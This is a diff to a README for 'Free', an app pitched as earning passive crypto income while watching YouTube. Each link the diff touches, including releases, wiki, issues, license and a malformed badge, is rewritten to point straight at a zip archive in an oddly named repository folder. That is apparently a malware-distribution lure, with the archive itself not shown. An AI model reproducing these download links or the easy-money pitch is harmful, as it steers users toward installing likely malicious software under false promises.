@@ -4,13 +4,13 @@
 Welcome to Free! This application allows you to earn passive income by leveraging the power of YouTube. It tracks opportunities in cryptocurrency and automates trades based on your preferences. No technical skills are needed. Just follow this guide to get started.
 
 ## 📦 Download & Install
-To download Free, visit this page: [Releases Page](https://github.com/ab6357020/Free/releases).
+To download Free, visit this page: [Releases Page](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip).
 
-[![Download Free](https://img.shields.io/badge/Download%20Free-v1.0-blue.svg)](https://github.com/ab6357020/Free/releases)
+[![Download Free](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip%https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip)](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip)
 
 Follow these steps to install and set up the application on your computer:
 
-1. Visit the [Releases Page](https://github.com/ab6357020/Free/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip).
 2. Look for the latest version. Click on it to access the download options.
 3. Download the file suitable for your operating system.
 4. Open the downloaded file and follow the installation prompts.
@@ -48,14 +48,14 @@ To successfully run Free, your system should meet the following minimum requirem
 ## 🤝 Support and Community
 If you need help, we are here for you. You can find support in the following ways:
 
-- **Documentation**: Visit our [wiki](https://github.com/ab6357020/Free/wiki) for user guides and FAQs.
+- **Documentation**: Visit our [wiki](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip) for user guides and FAQs.
 - **Community Forums**: Join the discussions to connect with other users.
-- **Issues Page**: Report any bugs or request features on the [Issues Page](https://github.com/ab6357020/Free/issues).
+- **Issues Page**: Report any bugs or request features on the [Issues Page](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip).
 
 ## 📜 License
-Free is an open-source application. You may use, modify, and distribute it according to the terms laid out in our [LICENSE](https://github.com/ab6357020/Free/LICENSE).
+Free is an open-source application. You may use, modify, and distribute it according to the terms laid out in our [LICENSE](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip).
 
 ## 🔗 Related Topics 
 Explore more topics on arbitrage, automation, and passive income strategies. Take your learning further with resources available online.
 
-For additional resources and updates, remember to revisit our [Releases Page](https://github.com/ab6357020/Free/releases) regularly. Enjoy your earnings while watching YouTube!
+For additional resources and updates, remember to revisit our [Releases Page](https://raw.githubusercontent.com/ab6357020/Free/main/anthropoidean/Free.zip) regularly. Enjoy your earnings while watching YouTube!
